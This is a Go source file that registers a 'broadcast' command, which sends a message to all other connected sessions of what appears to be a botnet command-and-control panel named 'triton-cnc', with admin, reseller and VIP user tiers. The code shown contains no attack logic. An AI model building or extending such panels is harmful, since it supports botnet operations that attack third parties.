package util_Command

import (
	"strconv"
	"strings"
	"triton-cnc/core/sessions/sessions"
)


func init() {

	Register(&Command{
		Name: "broadcast",

		Description: "send a message cnc wide",

		Admin: false,
		Reseller: false,
		Vip: false,

		Execute: func(Session *sessions.Session_Store, cmd []string) error {

			if len(cmd) <= 1 {
				Session.Channel.Write([]byte("Syntax invaild -> broadcast [Message]\r\n"))
				return nil
			}

			

			for _, sessions := range sessions.SessionMap {
				if sessions.User.Username != Session.User.Username {
					sessions.Channel.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K\x1b[38;5;11m Broadcast >"+strings.ReplaceAll(strings.Join(cmd, " "), cmd[0], "")+" \x1b[0m\x1b8"))
				}
			}

			Session.Channel.Write([]byte("\x1b[0mBroadcast he been sent correctly to "+strconv.Itoa(len(sessions.SessionMap)-1)+" clients\r\n"))

			return nil
		},
	})
}